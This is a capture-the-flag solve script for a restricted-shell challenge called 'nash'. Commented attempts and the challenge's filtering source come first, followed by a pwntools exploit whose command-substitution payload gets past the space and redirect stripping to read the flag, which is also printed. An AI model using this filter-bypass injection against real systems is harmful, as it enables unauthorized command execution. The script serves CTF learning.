'''
:!nc ctf.umbccd.io 5800
nash> id
uid=1000(challuser) gid=1000(challuser) groups=1000(challuser)
nash> ls
flag.txt  nash
nash> cat flag.txt
/bin/bash: line 1: catflag.txt: command not found
nash> cat<flag.txt
/bin/bash: line 1: catflag.txt: command not found
nash> cat*
/bin/bash: line 1: cat*: command not found
'''

'''
nash> $ sh
nash> $ ls -l
/bin/bash: line 1: ls-l: command not found
nash> $ bash
nash> $ ed
/bin/bash: line 1: ed: command not found
nash> $ vi
/bin/bash: line 1: vi: command not found
nash> $ $PATH
/bin/bash: line 1: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin: No such file or directory
'''
'''
nash> $ `ls`
/bin/bash: line 1: flag.txt: command not found
nash> $ cat`echo`flag.txt
/bin/bash: line 1: catflag.txt: command not found
'''

from pwn import *

p = remote('ctf.umbccd.io', 5800)

#p.sendline('sh')
# ps's output has a space in it
#p.sendline('cat`ps`*')
# which gets us the source of the challenge
'''
#!/bin/bash
EXIT="exit"

while [ 1 ]
do
    read -p 'nash> ' input
    echo $input | sed 's/ //g' | sed 's/{//g'| sed 's/}//g' | sed 's/IFS//g' | sed 's/(//g' | sed 's/)//g' | sed 's/[<>]//g'| /bin/bash
done
'''
# ps|head ensures that there's a space after the cat, ps|rev|head ensures there's a space before the *, which gets expanded into the flag
p.sendline('cat`ps|head``ps|rev|head`*')

# DawgCTF{n0_n0_eZ_r3d1r3ct10n_4_u_tR0LL$}

p.interactive()
